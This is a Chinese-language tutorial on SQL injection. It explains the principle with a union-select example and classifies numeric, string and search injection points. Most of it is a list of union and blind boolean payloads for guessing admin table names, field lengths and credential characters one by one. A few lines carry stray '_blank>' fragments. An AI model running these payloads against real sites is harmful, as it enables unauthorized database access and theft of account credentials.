# SQL注入

## SQL注入的原理

- 黑客以自己的意愿修改一条查询语句，以此来达到获取自己想要的信息的目的，通常都是利用网站对输入过滤不严格的漏洞来实现的。

- 简单例子：

    - `$query="select * from user where qq='$qq'"`;
    - 这是我们的查询语句，$qq是我们的变量，本来这里是提交QQ号的。比如QQ=123456
    - 查询语句为： `select * from user where qq=‘123456’`

    - 假如我们查询的qq为 `12345‘ union select * from admin --+`

    - 这时语句为 `select * from user where qq=‘12345‘ union select * from admin --+’`

    - 查询结果就会连 `admin` 的账号密码也输出出来。

## SQL注入的常用指令

- 数字型注入点

    - 许多网页链接有类似的结构 http://xxx.com/users.php?id=1 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。
    
    - 这一类的 SQL 语句原型大概为 select * from 表名 where id=1 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：
        
        `select * from 表名 where id=1 and 1=1`

- 字符型注入点

    - 网页链接有类似的结构 http://xxx.com/users.php?name=admin 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。
    
    - 这一类的 SQL 语句原型大概为 select * from 表名 where name='admin' 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

        `select * from 表名 where name='admin' and 1=1 ' `
        
    - 当然，在构造时要注意处理引号。

- 搜索型注入点

    - 这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 "keyword=关键字" 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。此类注入点提交的 SQL 语句，其原形大致为：select * from 表名 where 字段 like '%关键字%' 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：

        `select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'`

- GET POST Cookie HTTP头部等报文注入

    - 这类注入都通过在报文中加入内容来实现注入，Burp Suite是个很好的工具。

- 联合查询注入

    - 可以使用union的情况下的注入。
 
    - 常用语句
        - 判断有无注入点 

            `; and 1=1 and 1=2`

        - 猜表一般的表的名称无非是admin adminuser user pass password 等.. 

            `and 0<>(select count(*) from *) `

            `and 0<>(select count(*) from admin)` ---判断是否存在admin这张表

        - 猜帐号数目 如果遇到0< 返回正确页面 1<返回错误页面说明帐号数目就是1个 

            `and 0<(select count(*) from admin)` 

            `and 1<(select count(*) from admin)`

        - 猜解字段名称 在len( ) 括号里面加上我们想到的字段名称. 

            `and 1=(select count(*) from admin where len(*)>0)-- `

            `and 1=(select count(*) from admin where len(用户字段名称name)>0) `

            `and 1=(select count(*) from admin where len(_blank>密码字段名称password)>0)`

        - 猜解各个字段的长度 猜解长度就是把>0变换 直到返回正确页面为止 

            `and 1=(select count(*) from admin where len(*)>0) `

            `and 1=(select count(*) from admin where len(name)>6)` 错误 

            `and 1=(select count(*) from admin where len(name)>5)` 正确 长度是6 

            `and 1=(select count(*) from admin where len(name)=6)` 正确

            `and 1=(select count(*) from admin where len(password)>11)` 正确 

            `and 1=(select count(*) from admin where len(password)>12)` 错误 长度是12 

            `and 1=(select count(*) from admin where len(password)=12)` 正确

        - 猜解字符 

            `and 1=(select count(*) from admin where left(name,1)=a)` ---猜解用户帐号的第一位 

            `and 1=(select count(*) from admin where left(name,2)=ab)`---猜解用户帐号的第二位 

            就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 

            `and 1=(select top 1 count(*) from Admin where Asc(mid(pass,5,1))=51)`  这个查询语句可以猜解中文的用户和_blank>密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.